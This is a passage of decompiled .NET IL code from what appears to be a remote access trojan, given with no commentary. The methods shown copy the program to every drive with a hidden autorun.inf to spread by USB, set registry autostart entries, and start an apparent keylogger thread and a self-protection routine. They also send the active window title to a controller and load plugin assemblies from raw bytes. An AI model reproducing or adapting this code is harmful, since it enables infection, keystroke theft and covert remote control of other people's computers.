      IL_02e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02ec:  leave.s    IL_02ee

    }  // end handler
    IL_02ee:  nop
    IL_02ef:  nop
    IL_02f0:  ldsfld     bool w.OK::usb
    IL_02f5:  stloc.s    VB$CG$t_bool$S0
    IL_02f7:  ldloc.s    VB$CG$t_bool$S0
    IL_02f9:  brfalse    IL_040f

    IL_02fe:  ldstr      "autorun.inf"
    IL_0303:  stloc.s    f
    IL_0305:  ldsfld     string w.OK::usbx
    IL_030a:  stloc.s    g
    IL_030c:  ldc.i4.2
    IL_030d:  stloc.s    h
    IL_030f:  call       class w.My.MyComputer w.My.MyProject::get_Computer()
    IL_0314:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0319:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_031e:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0323:  stloc.s    a
    IL_0325:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_032a:  stloc.s    b
    IL_032c:  ldloc.s    b
    IL_032e:  stloc.s    VB$t_array$L1
    IL_0330:  ldc.i4.0
    IL_0331:  stloc.s    VB$t_i4$L0
    IL_0333:  br         IL_03fe

    IL_0338:  ldloc.s    VB$t_array$L1
    IL_033a:  ldloc.s    VB$t_i4$L0
    IL_033c:  ldelem.ref
    IL_033d:  stloc.s    a
    IL_033f:  nop
    .try
    {
      IL_0340:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0345:  ldloc.s    a
      IL_0347:  ldloc.s    g
      IL_0349:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_034e:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_0353:  nop
      IL_0354:  ldloc.s    a
      IL_0356:  ldloc.s    g
      IL_0358:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_035d:  ldloc.s    h
      IL_035f:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_0364:  nop
      IL_0365:  leave.s    IL_0377

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0367:  dup
      IL_0368:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_036d:  stloc.s    V_11
      IL_036f:  nop
      IL_0370:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0375:  leave.s    IL_0377

    }  // end handler
    IL_0377:  nop
    IL_0378:  nop
    .try
    {
      IL_0379:  ldloc.s    a
      IL_037b:  ldstr      "\\"
      IL_0380:  ldloc.s    f
      IL_0382:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0387:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
      IL_038c:  stloc.s    c
      IL_038e:  ldloc.s    c
      IL_0390:  ldstr      "[autorun]"
      IL_0395:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_039a:  nop
      IL_039b:  ldloc.s    c
      IL_039d:  ldstr      "open="
      IL_03a2:  ldloc.s    a
      IL_03a4:  ldloc.s    g
      IL_03a6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ab:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_03b0:  nop
      IL_03b1:  ldloc.s    c
      IL_03b3:  ldstr      "shellexecute="
      IL_03b8:  ldloc.s    a
      IL_03ba:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03bf:  ldc.i4.1
      IL_03c0:  box        [mscorlib]System.Int32
      IL_03c5:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string,
                                                                                   object)
      IL_03ca:  nop
      IL_03cb:  ldloc.s    c
      IL_03cd:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
      IL_03d2:  nop
      IL_03d3:  ldloc.s    a
      IL_03d5:  ldloc.s    f
      IL_03d7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03dc:  ldloc.s    h
      IL_03de:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_03e3:  nop
      IL_03e4:  leave.s    IL_03f6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03e6:  dup
      IL_03e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03ec:  stloc.s    V_13
      IL_03ee:  nop
      IL_03ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03f4:  leave.s    IL_03f6

    }  // end handler
    IL_03f6:  nop
    IL_03f7:  ldloc.s    VB$t_i4$L0
    IL_03f9:  ldc.i4.1
    IL_03fa:  add.ovf
    IL_03fb:  stloc.s    VB$t_i4$L0
    IL_03fd:  nop
    IL_03fe:  ldloc.s    VB$t_i4$L0
    IL_0400:  ldloc.s    VB$t_array$L1
    IL_0402:  ldlen
    IL_0403:  conv.ovf.i4
    IL_0404:  clt
    IL_0406:  stloc.s    VB$CG$t_bool$S0
    IL_0408:  ldloc.s    VB$CG$t_bool$S0
    IL_040a:  brtrue     IL_0338

    IL_040f:  nop
    IL_0410:  nop
    IL_0411:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining
  {
    // Code size       934 (0x3a6)
    .maxstack  5
    .locals init ([0] bool createdNew,
             [1] class [mscorlib]System.Threading.Thread mm,
             [2] int32 num,
             [3] string str,
             [4] class [mscorlib]System.Exception exception1,
             [5] class [mscorlib]System.Threading.Thread ms,
             [6] class [mscorlib]System.Exception exception8,
             [7] class [mscorlib]System.Threading.Thread st,
             [8] class w.mgr ta,
             [9] class [mscorlib]System.Exception exception9,
             [10] class [mscorlib]System.Exception exception10,
             [11] string str2,
             [12] class [mscorlib]System.Exception exception11,
             [13] class [mscorlib]System.Exception exception12,
             [14] class [mscorlib]System.Exception exception13,
             [15] class w.mgr VB$t_ref$S0,
             [16] native int VB$t_struct$N0,
             [17] bool VB$CG$t_bool$S0,
             [18] bool VB$CG$t_bool$S1)
    IL_0000:  nop
    IL_0001:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0006:  ldnull
    IL_0007:  ceq
    IL_0009:  ldc.i4.0
    IL_000a:  ceq
    IL_000c:  stloc.s    VB$CG$t_bool$S0
    IL_000e:  ldloc.s    VB$CG$t_bool$S0
    IL_0010:  brfalse.s  IL_0050

    IL_0012:  nop
    .try
    {
      IL_0013:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_0018:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_001d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0022:  ldstr      "di"
      IL_0027:  ldstr      "!"
      IL_002c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0031:  nop
      IL_0032:  leave.s    IL_0044

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0034:  dup
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  stloc.s    exception1
      IL_003c:  nop
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0042:  leave.s    IL_0044

    }  // end handler
    IL_0044:  nop
    IL_0045:  ldc.i4     0x1388
    IL_004a:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_004f:  nop
    IL_0050:  nop
    IL_0051:  ldc.i4.0
    IL_0052:  stloc.0
    IL_0053:  ldc.i4.1
    IL_0054:  ldsfld     string w.OK::RG
    IL_0059:  ldloca.s   createdNew
    IL_005b:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_0060:  stsfld     object w.OK::MT
    IL_0065:  ldloc.0
    IL_0066:  ldc.i4.0
    IL_0067:  ceq
    IL_0069:  stloc.s    VB$CG$t_bool$S0
    IL_006b:  ldloc.s    VB$CG$t_bool$S0
    IL_006d:  brfalse.s  IL_0075

    IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0074:  nop
    IL_0075:  nop
    IL_0076:  call       void w.OK::INS()
    IL_007b:  nop
    IL_007c:  ldsfld     bool w.OK::Idr
    IL_0081:  ldc.i4.0
    IL_0082:  ceq
    IL_0084:  stloc.s    VB$CG$t_bool$S0
    IL_0086:  ldloc.s    VB$CG$t_bool$S0
    IL_0088:  brfalse.s  IL_00ad

    IL_008a:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
    IL_008f:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0094:  stsfld     string w.OK::EXE
    IL_0099:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
    IL_009e:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_00a3:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_00a8:  stsfld     string w.OK::DR
    IL_00ad:  nop
    IL_00ae:  ldnull
    IL_00af:  ldftn      void w.OK::RC()
    IL_00b5:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_00ba:  ldc.i4.1
    IL_00bb:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_00c0:  stloc.1
    IL_00c1:  ldloc.1
    IL_00c2:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_00c7:  nop
    IL_00c8:  nop
    .try
    {
      IL_00c9:  newobj     instance void w.kl::.ctor()
      IL_00ce:  stsfld     class w.kl w.OK::kq
      IL_00d3:  ldsfld     class w.kl w.OK::kq
      IL_00d8:  dup
      IL_00d9:  ldvirtftn  instance void w.kl::WRK()
      IL_00df:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_00e4:  ldc.i4.1
      IL_00e5:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_00ea:  stloc.s    ms
      IL_00ec:  ldloc.s    ms
      IL_00ee:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_00f3:  nop
      IL_00f4:  leave.s    IL_0106

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f6:  dup
      IL_00f7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fc:  stloc.s    exception8
      IL_00fe:  nop
      IL_00ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0104:  leave.s    IL_0106

    }  // end handler
    IL_0106:  nop
    IL_0107:  ldsfld     bool w.OK::task
    IL_010c:  stloc.s    VB$CG$t_bool$S0
    IL_010e:  ldloc.s    VB$CG$t_bool$S0
    IL_0110:  brfalse.s  IL_0136

    IL_0112:  newobj     instance void w.mgr::.ctor()
    IL_0117:  stloc.s    ta
    IL_0119:  ldloc.s    ta
    IL_011b:  dup
    IL_011c:  ldvirtftn  instance void w.mgr::protect()
    IL_0122:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0127:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_012c:  stloc.s    st
    IL_012e:  ldloc.s    st
    IL_0130:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0135:  nop
    IL_0136:  nop
    IL_0137:  ldc.i4.0
    IL_0138:  stloc.2
    IL_0139:  ldstr      ""
    IL_013e:  stloc.3
    IL_013f:  ldsfld     bool w.OK::BD
    IL_0144:  stloc.s    VB$CG$t_bool$S0
    IL_0146:  ldloc.s    VB$CG$t_bool$S0
    IL_0148:  brfalse.s  IL_0177

    IL_014a:  nop
    .try
    {
      IL_014b:  ldnull
      IL_014c:  ldftn      void w.OK::im(object,
                                         class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0152:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_0157:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_015c:  nop
      IL_015d:  ldc.i4.1
      IL_015e:  call       void w.OK::pr(int32)
      IL_0163:  nop
      IL_0164:  leave.s    IL_0176

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0166:  dup
      IL_0167:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016c:  stloc.s    exception9
      IL_016e:  nop
      IL_016f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0174:  leave.s    IL_0176

    }  // end handler
    IL_0176:  nop
    IL_0177:  nop
    IL_0178:  br         IL_039a

    IL_017d:  ldc.i4     0x3e8
    IL_0182:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0187:  nop
    IL_0188:  ldsfld     bool w.OK::Cn
    IL_018d:  ldc.i4.0
    IL_018e:  ceq
    IL_0190:  stloc.s    VB$CG$t_bool$S0
    IL_0192:  ldloc.s    VB$CG$t_bool$S0
    IL_0194:  brfalse.s  IL_019c

    IL_0196:  ldstr      ""
    IL_019b:  stloc.3
    IL_019c:  nop
    IL_019d:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    IL_01a2:  nop
    IL_01a3:  nop
    .try
    {
      IL_01a4:  ldloc.2
      IL_01a5:  ldc.i4.1
      IL_01a6:  add.ovf
      IL_01a7:  stloc.2
      IL_01a8:  ldloc.2
      IL_01a9:  ldc.i4.5
      IL_01aa:  ceq
      IL_01ac:  stloc.s    VB$CG$t_bool$S0
      IL_01ae:  ldloc.s    VB$CG$t_bool$S0
      IL_01b0:  brfalse.s  IL_01db

      IL_01b2:  nop
      .try
      {
        IL_01b3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01b8:  ldc.i4     0x400
        IL_01bd:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01c2:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01c7:  nop
        IL_01c8:  leave.s    IL_01da

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01ca:  dup
        IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01d0:  stloc.s    exception10
        IL_01d2:  nop
        IL_01d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01d8:  leave.s    IL_01da

      }  // end handler
      IL_01da:  nop
      IL_01db:  nop
      IL_01dc:  ldloc.2
      IL_01dd:  ldc.i4.8
      IL_01de:  clt
      IL_01e0:  ldc.i4.0
      IL_01e1:  ceq
      IL_01e3:  stloc.s    VB$CG$t_bool$S0
      IL_01e5:  ldloc.s    VB$CG$t_bool$S0
      IL_01e7:  brfalse.s  IL_0222

      IL_01e9:  ldc.i4.0
      IL_01ea:  stloc.2
      IL_01eb:  call       string w.OK::ACT()
      IL_01f0:  stloc.s    str2
      IL_01f2:  ldloc.3
      IL_01f3:  ldloc.s    str2
      IL_01f5:  ldc.i4.0
      IL_01f6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_01fb:  ldc.i4.0
      IL_01fc:  ceq
      IL_01fe:  ldc.i4.0
      IL_01ff:  ceq
      IL_0201:  stloc.s    VB$CG$t_bool$S0
      IL_0203:  ldloc.s    VB$CG$t_bool$S0
      IL_0205:  brfalse.s  IL_0221

      IL_0207:  ldloc.s    str2
      IL_0209:  stloc.3
      IL_020a:  ldstr      "act"
      IL_020f:  ldsfld     string w.OK::Y
      IL_0214:  ldloc.s    str2
      IL_0216:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_021b:  call       bool w.OK::Send(string)
      IL_0220:  pop
      IL_0221:  nop
      IL_0222:  nop
      IL_0223:  ldsfld     bool w.OK::Isu
      IL_0228:  stloc.s    VB$CG$t_bool$S0
      IL_022a:  ldloc.s    VB$CG$t_bool$S0
      IL_022c:  brfalse    IL_0385

      IL_0231:  nop
      .try
      {
        IL_0232:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
        IL_0237:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_023c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0241:  ldsfld     string w.OK::sf
        IL_0246:  ldstr      "\\"
        IL_024b:  ldsfld     string w.OK::RG
        IL_0250:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0255:  ldstr      ""
        IL_025a:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_025f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0264:  ldstr      "\""
        IL_0269:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
        IL_026e:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0273:  ldstr      "\" .."
        IL_0278:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_027d:  ldc.i4.0
        IL_027e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0283:  stloc.s    VB$CG$t_bool$S1
        IL_0285:  ldloc.s    VB$CG$t_bool$S1
        IL_0287:  brfalse.s  IL_02c7

        IL_0289:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
        IL_028e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0293:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0298:  ldsfld     string w.OK::sf
        IL_029d:  ldc.i4.1
        IL_029e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02a3:  ldsfld     string w.OK::RG
        IL_02a8:  ldstr      "\""
        IL_02ad:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
        IL_02b2:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02b7:  ldstr      "\" .."
        IL_02bc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02c1:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02c6:  nop
        IL_02c7:  nop
        IL_02c8:  leave.s    IL_02da

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02ca:  dup
        IL_02cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02d0:  stloc.s    exception11
        IL_02d2:  nop
        IL_02d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02d8:  leave.s    IL_02da

      }  // end handler
      IL_02da:  nop
      IL_02db:  nop
      .try
      {
        IL_02dc:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
        IL_02e1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02e6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_02eb:  ldsfld     string w.OK::sf
        IL_02f0:  ldstr      "\\"
        IL_02f5:  ldsfld     string w.OK::RG
        IL_02fa:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02ff:  ldstr      ""
        IL_0304:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0309:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_030e:  ldstr      "\""
        IL_0313:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
        IL_0318:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_031d:  ldstr      "\" .."
        IL_0322:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0327:  ldc.i4.0
        IL_0328:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_032d:  stloc.s    VB$CG$t_bool$S1
        IL_032f:  ldloc.s    VB$CG$t_bool$S1
        IL_0331:  brfalse.s  IL_0371

        IL_0333:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
        IL_0338:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_033d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0342:  ldsfld     string w.OK::sf
        IL_0347:  ldc.i4.1
        IL_0348:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_034d:  ldsfld     string w.OK::RG
        IL_0352:  ldstr      "\""
        IL_0357:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
        IL_035c:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0361:  ldstr      "\" .."
        IL_0366:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_036b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0370:  nop
        IL_0371:  nop
        IL_0372:  leave.s    IL_0384

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0374:  dup
        IL_0375:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_037a:  stloc.s    exception12
        IL_037c:  nop
        IL_037d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0382:  leave.s    IL_0384

      }  // end handler
      IL_0384:  nop
      IL_0385:  nop
      IL_0386:  leave.s    IL_0398

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0388:  dup
      IL_0389:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_038e:  stloc.s    exception13
      IL_0390:  nop
      IL_0391:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0396:  leave.s    IL_0398

    }  // end handler
    IL_0398:  nop
    IL_0399:  nop
    IL_039a:  ldc.i4.1
    IL_039b:  stloc.s    VB$CG$t_bool$S1
    IL_039d:  ldloc.s    VB$CG$t_bool$S1
    IL_039f:  brtrue     IL_017d

    IL_03a4:  nop
    IL_03a5:  ret
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       73 (0x49)
    .maxstack  3
    .locals init ([0] uint8[] array1,
             [1] string md5,
             [2] int32 num1,
             [3] string str2,
             [4] uint8 byte1,
             [5] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000c:  starg.s    B
    IL_000e:  ldstr      ""
    IL_0013:  stloc.3
    IL_0014:  ldarg.0
    IL_0015:  stloc.0
    IL_0016:  ldc.i4.0
    IL_0017:  stloc.2
    IL_0018:  br.s       IL_0037

    IL_001a:  ldloc.0
    IL_001b:  ldloc.2
    IL_001c:  ldelem.u1
    IL_001d:  stloc.s    byte1
    IL_001f:  ldloc.3
    IL_0020:  ldloca.s   byte1
    IL_0022:  ldstr      "x2"
    IL_0027:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0031:  stloc.3
    IL_0032:  ldloc.2
    IL_0033:  ldc.i4.1
    IL_0034:  add.ovf
    IL_0035:  stloc.2
    IL_0036:  nop
    IL_0037:  ldloc.2
    IL_0038:  ldloc.0
    IL_0039:  ldlen
    IL_003a:  conv.ovf.i4
    IL_003b:  clt
    IL_003d:  stloc.s    VB$CG$t_bool$S0
    IL_003f:  ldloc.s    VB$CG$t_bool$S0
    IL_0041:  brtrue.s   IL_001a

    IL_0043:  ldloc.3
    IL_0044:  stloc.1
    IL_0045:  br.s       IL_0047

    IL_0047:  ldloc.1
    IL_0048:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       144 (0x90)
    .maxstack  3
    .locals init ([0] class [mscorlib]System.Reflection.Module[] modules,
             [1] object Plugin,
             [2] int32 i,
             [3] class [mscorlib]System.Reflection.Module module,
             [4] class [mscorlib]System.Type[] types,
             [5] int32 j,
             [6] class [mscorlib]System.Type 'type',
             [7] int32 VB$t_i4$L0,
             [8] int32 VB$t_i4$L1,
             [9] bool VB$CG$t_bool$S0,
             [10] int32 VB$CG$t_i4$S0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0007:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000c:  stloc.0
    IL_000d:  ldc.i4.0
    IL_000e:  ldloc.0
    IL_000f:  ldlen
    IL_0010:  conv.ovf.i4
    IL_0011:  ldc.i4.1
    IL_0012:  sub.ovf
    IL_0013:  stloc.s    VB$t_i4$L0
    IL_0015:  stloc.2
    IL_0016:  br.s       IL_0081

    IL_0018:  ldloc.0
    IL_0019:  ldloc.2
    IL_001a:  ldelem.ref
    IL_001b:  stloc.3
    IL_001c:  ldloc.3
    IL_001d:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_0022:  stloc.s    types
    IL_0024:  ldc.i4.0
    IL_0025:  ldloc.s    types
    IL_0027:  ldlen
    IL_0028:  conv.ovf.i4
    IL_0029:  ldc.i4.1
    IL_002a:  sub.ovf
    IL_002b:  stloc.s    VB$t_i4$L1
    IL_002d:  stloc.s    j
    IL_002f:  br.s       IL_0072

    IL_0031:  ldloc.s    types
    IL_0033:  ldloc.s    j
    IL_0035:  ldelem.ref
    IL_0036:  stloc.s    'type'
    IL_0038:  ldloc.s    'type'
    IL_003a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_003f:  ldstr      "."
    IL_0044:  ldarg.1
    IL_0045:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_004a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_004f:  stloc.s    VB$CG$t_bool$S0
    IL_0051:  ldloc.s    VB$CG$t_bool$S0
